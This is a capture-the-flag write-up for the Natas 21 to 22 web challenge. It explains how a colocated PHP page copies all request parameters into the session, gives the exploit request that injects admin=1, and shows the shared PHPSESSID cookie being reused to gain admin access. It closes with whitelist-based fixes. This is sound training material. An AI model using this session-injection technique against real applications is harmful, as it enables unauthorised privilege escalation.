# 🔓 Challenge: Natas Level 21 → 22

## 📋 Objective

Find the password for **Natas 22**, which requires logging in as an administrator to retrieve the credentials.

The page initially reports:

```
You are logged in as a regular user.
```

The level also provides an important hint:

```
This website is colocated with natas21-experimenter.
```

---

## 🔍 Analysis

### Inspecting the Source Code

The main Natas 21 page contains:

```php
<?php
function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}

session_start();
print_credentials();
?>
```

The critical condition is:

```php
$_SESSION["admin"] == 1
```

**The objective:** Get the server to load a session containing `admin = 1`.

There is no functionality on this page that actually sets the admin session variable, so we need to investigate the colocated experimenter application.

### Inspecting the Experimenter

The experimenter contains the following vulnerable logic:

```php
session_start();

if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

**Critical Flaw:** This is the vulnerability.

The application iterates through every parameter supplied in the request and copies it directly into the session **without any validation**.

For example, sending:

```
admin=1
```

causes:

```php
$_SESSION["admin"] = "1";
```

The `submit` parameter is also important because it triggers the vulnerable `foreach` loop to execute.

---

## 💡 Exploitation Strategy

### Understanding the Intended Restrictions

The application later defines:

```php
$validkeys = array(
    "align" => "center",
    "fontsize" => "100%",
    "bgcolor" => "yellow"
);
```

At first, this looks like it restricts which values can be stored. However, **this list is not used to validate the earlier request**.

The vulnerable code processes:

```php
foreach($_REQUEST as $key => $val)
```

Rather than checking whether `$key` exists in `$validkeys`. Therefore, **arbitrary session variables can be created**.

### Session Sharing

The level description mentions that the applications are colocated.

**PHP sessions are identified using the `PHPSESSID` cookie.**

The key insight:
1. Obtain the `PHPSESSID` used by the experimenter
2. Use the **same session ID** when accessing Natas 21
3. Both applications share the same session storage, so the injected variables persist

**Attack Flow:**

```
Experimenter
     |
     | admin=1
     v
$_SESSION["admin"] = "1"
     |
     | same PHPSESSID
     v
Natas 21
     |
     | session_start()
     v
$_SESSION["admin"] == 1
     |
     v
Administrator access
```

---

## ✅ Solution

### Exploit Request

Using Burp Suite, modify the request to include:

```
align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
```

**The critical parameters are:**

- `admin=1` — Arbitrary session variable injection
- `submit=Update` — Triggers the vulnerable `foreach` loop

The `submit` parameter triggers:

```php
if(array_key_exists("submit", $_REQUEST))
```

Then the loop processes the parameters:

```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```

As a result:

```php
$_SESSION["admin"] = "1";
```

### Execution Flow

**Step 1: Access Experimenter with Payload**

```
GET /index.php?submit=1&admin=1
```

**Step 2: Extract PHPSESSID Cookie**

Obtain the session cookie from the experimenter response.

**Step 3: Access Natas 21 with Same PHPSESSID**

Natas 21 executes:

```php
session_start();
```

And loads the session containing:

```php
admin = 1
```

The following condition is therefore satisfied:

```php
$_SESSION["admin"] == 1
```

This grants administrator access and reveals the credentials for Natas 22.

---

## 🛡️ Prevention & Remediation

### The Vulnerability

The vulnerability is **arbitrary session variable injection**.

The application trusts all user-controlled request parameters and copies them directly into `$_SESSION`:

```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```

This grants attackers complete control over the session state.

### Secure Implementation

A secure implementation should **explicitly whitelist permitted parameters** before storing them in the session:

```php
foreach($validkeys as $key => $default) {
    if(isset($_REQUEST[$key])) {
        $_SESSION[$key] = $_REQUEST[$key];
    }
}
```

This would prevent an attacker from creating unexpected session variables such as:

```
admin=1
```

### Secure Alternatives

1. **Best Practice: Use a Whitelist of Allowed Session Keys**
   ```php
   $allowed_keys = ['align', 'fontsize', 'bgcolor'];
   
   if(array_key_exists("submit", $_REQUEST)) {
       foreach($allowed_keys as $key) {
           if(isset($_REQUEST[$key])) {
               $_SESSION[$key] = $_REQUEST[$key];
           }
       }
   }
   ```

2. **Validate and Sanitize Input**
   ```php
   if(array_key_exists("submit", $_REQUEST)) {
       if(!empty($_REQUEST['align']) && in_array($_REQUEST['align'], ['left', 'center', 'right'])) {
           $_SESSION['align'] = $_REQUEST['align'];
       }
   }
   ```

3. **Never Allow Direct Session Manipulation from User Input**
   ```php
   // Use dedicated authentication functions
   if(authenticate_user($_REQUEST['username'], $_REQUEST['password'])) {
       $_SESSION["admin"] = check_admin_status($_REQUEST['username']);
   }
   ```

---

## 🎯 Key Takeaways

- **Always inspect the source code** before attempting random payloads
- **Never blindly inject user input into session variables** — this grants attackers complete control over session state
- **Whitelist allowed session keys** instead of accepting any parameter
- **A whitelist is only useful if it is actually used for validation** — the `$validkeys` array was defined but not checked
- **PHPSESSID determines which PHP session is loaded**
- **When multiple applications share session storage**, vulnerabilities in one application can potentially affect another
- **The objective was not to bypass a password directly** — it was to manipulate the server-side session state so that the authorization check passed
- **User-controlled request parameters should not be copied directly into session data**

---

## 🔧 Tools Used

- Burp Suite (request modification and parameter injection)
- Browser Developer Tools (cookie inspection)
- PHP source-code analysis

---

## 🛠️ Vulnerability Classification

**Type:** Improper Session Handling / Arbitrary Session Variable Injection

**CWE:** CWE-384 (Session Fixation)

**Severity:** High (Direct privilege escalation)

**Attack Vector:** Network, requires colocated application access
